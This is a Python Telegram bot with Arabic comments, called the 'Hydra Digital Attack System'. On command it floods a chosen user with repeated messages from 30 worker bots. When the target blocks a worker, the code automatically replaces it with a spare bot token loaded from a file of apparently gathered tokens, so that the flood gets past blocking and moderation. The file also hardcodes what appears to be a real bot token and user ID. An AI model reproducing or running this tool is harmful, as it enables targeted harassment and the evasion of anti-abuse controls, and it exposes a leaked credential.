import asyncio
import logging
import random
import time
from telegram import Bot, Update, error
from telegram.ext import Application, CommandHandler, ContextTypes

# ----------------------------------------------------------------------
# إعدادات البوت
# ----------------------------------------------------------------------

# توكن البوت الأم (يجب استبداله بتوكن البوت الخاص بك)
MASTER_BOT_TOKEN = "8248146243:AAGCbKBLKrkdqqUXKUcqe75nQi0pffYUOTU"
# معرف المستخدم (ID) الذي يُسمح له بإصدار الأوامر (لأمان البوت)
# يمكنك الحصول عليه من بوت @userinfobot
AUTHORIZED_USER_ID = 7281928709  # استبدل بـ ID الخاص بك

# ----------------------------------------------------------------------
# حالة الهجوم العالمية
# ----------------------------------------------------------------------

# قائمة التوكنات الصالحة التي تم تجميعها (سيتم تحميلها من ملف)
VALID_TOKENS = []
# قائمة البوتات العاملة النشطة حاليًا
ACTIVE_WORKERS = {}  # {token: Bot instance}
# حالة الهجوم
ATTACK_STATE = {
    "is_active": False,
    "target_username": None,
    "target_chat_id": None,
    "message_payload": None,
    "messages_sent": 0,
    "bots_blocked": 0,
    "bots_replaced": 0,
    "start_time": 0,
}
# قفل للمزامنة عند تعديل حالة الهجوم
STATE_LOCK = asyncio.Lock()

# ----------------------------------------------------------------------
# وظائف مساعدة
# ----------------------------------------------------------------------

def load_tokens():
    """تحميل التوكنات الصالحة من ملف valid_tokens.txt"""
    global VALID_TOKENS
    try:
        with open("valid_tokens.txt", "r") as f:
            VALID_TOKENS = [line.strip() for line in f if line.strip()]
        logging.info(f"تم تحميل {len(VALID_TOKENS)} توكن صالح.")
    except FileNotFoundError:
        logging.error("ملف valid_tokens.txt غير موجود. يرجى تشغيل database.py أولاً.")

def get_next_token():
    """الحصول على توكن عشوائي من القائمة الاحتياطية وإزالته منها"""
    if not VALID_TOKENS:
        return None
    token = random.choice(VALID_TOKENS)
    VALID_TOKENS.remove(token)
    return token

async def send_message_task(token, target_chat_id, message_payload):
    """
    مهمة إرسال الرسائل المتكررة لبوت عامل واحد.
    هذه هي آلية "هيدرا" للكشف عن الحظر.
    """
    bot = Bot(token)
    
    async with STATE_LOCK:
        ACTIVE_WORKERS[token] = bot
    
    logging.info(f"البوت العامل {token[:10]}... بدأ الإرسال.")

    while ATTACK_STATE["is_active"]:
        try:
            # محاولة إرسال الرسالة
            await bot.send_message(chat_id=target_chat_id, text=message_payload)
            
            async with STATE_LOCK:
                ATTACK_STATE["messages_sent"] += 1
            
            # تأخير بسيط لتجنب حظر IP (يمكن تعديله)
            # هذا التأخير يضمن أن كل بوت عامل يرسل رسالة واحدة في الثانية للهدف
            await asyncio.sleep(1)

        except error.Forbidden:
            # **آلية هيدرا: تم حظر البوت!**
            logging.warning(f"البوت العامل {token[:10]}... تم حظره (Forbidden).")
            
            async with STATE_LOCK:
                ATTACK_STATE["bots_blocked"] += 1
                del ACTIVE_WORKERS[token]
            
            # بدء عملية الاستبدال
            asyncio.create_task(replace_worker())
            break
            
        except error.TelegramError as e:
            # أخطاء أخرى (مثل خطأ في التوكن، أو انتهاء المهلة)
            logging.error(f"خطأ في البوت العامل {token[:10]}...: {e}")
            
            async with STATE_LOCK:
                del ACTIVE_WORKERS[token]
            
            asyncio.create_task(replace_worker())
            break
            
        except Exception as e:
            logging.error(f"خطأ غير متوقع في البوت العامل {token[:10]}...: {e}")
            break

async def replace_worker():
    """وظيفة استبدال بوت عامل محظور أو فاشل."""
    
    # التأكد من أن الهجوم لا يزال نشطًا
    if not ATTACK_STATE["is_active"]:
        return

    new_token = get_next_token()
    
    if new_token:
        async with STATE_LOCK:
            ATTACK_STATE["bots_replaced"] += 1
        
        logging.info(f"استبدال بوت. التوكن الجديد: {new_token[:10]}...")
        
        # بدء مهمة الإرسال للتوكن الجديد
        asyncio.create_task(
            send_message_task(
                new_token,
                ATTACK_STATE["target_chat_id"],
                ATTACK_STATE["message_payload"]
            )
        )
    else:
        logging.error("لا توجد توكنات احتياطية متبقية! الهجوم سيعمل بعدد البوتات المتبقية.")

async def start_swarm():
    """بدء سرب البوتات العاملة (30 بوتًا)"""
    
    # التأكد من أن الهدف هو معرف (ID) وليس اسم مستخدم
    try:
        # محاولة الحصول على ID الهدف من اسم المستخدم
        master_bot = Bot(MASTER_BOT_TOKEN)
        chat = await master_bot.get_chat(ATTACK_STATE["target_username"])
        ATTACK_STATE["target_chat_id"] = chat.id
    except Exception as e:
        logging.error(f"فشل في الحصول على ID الهدف: {e}")
        return False

    # بدء 30 بوتًا عاملاً
    for _ in range(30):
        token = get_next_token()
        if token:
            asyncio.create_task(
                send_message_task(
                    token,
                    ATTACK_STATE["target_chat_id"],
                    ATTACK_STATE["message_payload"]
                )
            )
        else:
            logging.warning("نفدت التوكنات قبل الوصول إلى 30 بوت.")
            break
            
    ATTACK_STATE["start_time"] = time.time()
    return True

# ----------------------------------------------------------------------
# أوامر البوت الأم
# ----------------------------------------------------------------------

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """الرد على أمر /start وعرض قائمة الأوامر."""
    if update.effective_user.id != AUTHORIZED_USER_ID:
        await update.message.reply_text("غير مصرح لك باستخدام هذا البوت.")
        return

    help_text = (
        "🤖 **نظام هيدرا للهجوم الرقمي (Hydra Digital Attack System)**\n\n"
        "**الأوامر المتاحة:**\n"
        "1. `/attack <username> <رسالة>`: لبدء هجوم الإغراق.\n"
        "   مثال: `/attack @TargetUsername هذه رسالة لا تتوقف`\n"
        "2. `/stop`: لإيقاف الهجوم النشط فورًا.\n"
        "3. `/status`: لعرض تقرير مفصل عن حالة الهجوم الحالي.\n"
        "4. `/info`: لعرض معلومات البوت والتوكنات المحملة."
    )
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """عرض معلومات البوت والتوكنات المحملة."""
    if update.effective_user.id != AUTHORIZED_USER_ID:
        return

    info_text = (
        f"**معلومات النظام:**\n"
        f"• توكنات صالحة متبقية: {len(VALID_TOKENS)}\n"
        f"• بوتات عاملة نشطة: {len(ACTIVE_WORKERS)}\n"
        f"• حالة الهجوم: {'نشط' if ATTACK_STATE['is_active'] else 'خامل'}"
    )
    await update.message.reply_text(info_text, parse_mode='Markdown')

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """بدء هجوم الإغراق."""
    if update.effective_user.id != AUTHORIZED_USER_ID:
        return

    if ATTACK_STATE["is_active"]:
        await update.message.reply_text("الهجوم نشط بالفعل. يرجى استخدام `/stop` أولاً.")
        return

    if len(context.args) < 2:
        await update.message.reply_text("خطأ: يرجى تحديد اسم المستخدم والرسالة.\nمثال: `/attack @TargetUsername هذه رسالة لا تتوقف`")
        return

    target_username = context.args[0]
    message_payload = " ".join(context.args[1:])

    if not target_username.startswith('@'):
        await update.message.reply_text("خطأ: يجب أن يبدأ اسم المستخدم بـ `@`.")
        return

    if len(ACTIVE_WORKERS) > 0:
        await update.message.reply_text("خطأ: هناك بوتات عاملة نشطة. يرجى التحقق من `/status`.")
        return

    if len(VALID_TOKENS) < 30:
        await update.message.reply_text(f"تحذير: التوكنات المتبقية ({len(VALID_TOKENS)}) أقل من 30. الهجوم سيبدأ بالتوكنات المتاحة.")

    # إعداد حالة الهجوم
    async with STATE_LOCK:
        ATTACK_STATE["is_active"] = True
        ATTACK_STATE["target_username"] = target_username
        ATTACK_STATE["message_payload"] = message_payload
        ATTACK_STATE["messages_sent"] = 0
        ATTACK_STATE["bots_blocked"] = 0
        ATTACK_STATE["bots_replaced"] = 0
        ATTACK_STATE["start_time"] = 0

    await update.message.reply_text(f"بدء هجوم الإغراق على {target_username} برسالة: '{message_payload}'...")

    if await start_swarm():
        await update.message.reply_text("تم نشر سرب هيدرا بنجاح! استخدم `/status` للمراقبة.")
    else:
        async with STATE_LOCK:
            ATTACK_STATE["is_active"] = False
        await update.message.reply_text("فشل في بدء الهجوم. تأكد من أن اسم المستخدم صحيح.")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """إيقاف الهجوم النشط."""
    if update.effective_user.id != AUTHORIZED_USER_ID:
        return

    if not ATTACK_STATE["is_active"]:
        await update.message.reply_text("لا يوجد هجوم نشط لإيقافه.")
        return

    async with STATE_LOCK:
        ATTACK_STATE["is_active"] = False

    await update.message.reply_text("تم إيقاف هجوم هيدرا بنجاح. جميع البوتات العاملة توقفت.")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """عرض تقرير مفصل عن حالة الهجوم."""
    if update.effective_user.id != AUTHORIZED_USER_ID:
        return

    if not ATTACK_STATE["is_active"]:
        await update.message.reply_text("لا يوجد هجوم نشط حاليًا. استخدم `/attack` للبدء.")
        return

    elapsed_time = time.time() - ATTACK_STATE["start_time"]
    
    status_text = (
        f"**تقرير حالة هجوم هيدرا**\n"
        f"• **الهدف:** {ATTACK_STATE['target_username']}\n"
        f"• **الرسالة:** {ATTACK_STATE['message_payload'][:50]}...\n"
        f"• **مدة الهجوم:** {int(elapsed_time // 3600)} ساعة، {int((elapsed_time % 3600) // 60)} دقيقة، {int(elapsed_time % 60)} ثانية\n"
        f"• **البوتات النشطة:** {len(ACTIVE_WORKERS)} / 30\n"
        f"• **إجمالي الرسائل المرسلة:** {ATTACK_STATE['messages_sent']}\n"
        f"• **البوتات المحظورة:** {ATTACK_STATE['bots_blocked']}\n"
        f"• **البوتات المستبدلة:** {ATTACK_STATE['bots_replaced']}\n"
        f"• **توكنات احتياطية متبقية:** {len(VALID_TOKENS)}"
    )
    await update.message.reply_text(status_text, parse_mode='Markdown')

# ----------------------------------------------------------------------
# الوظيفة الرئيسية
# ----------------------------------------------------------------------

def main() -> None:
    """تشغيل البوت الأم."""
    
    # إعداد التسجيل
    logging.basicConfig(
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
    )
    
    # تحميل التوكنات
    load_tokens()

    # إنشاء التطبيق
    application = Application.builder().token(MASTER_BOT_TOKEN).build()

    # إضافة معالجات الأوامر
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("info", info_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("status", status_command))

    # بدء البوت
    logging.info("بدء تشغيل البوت الأم...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
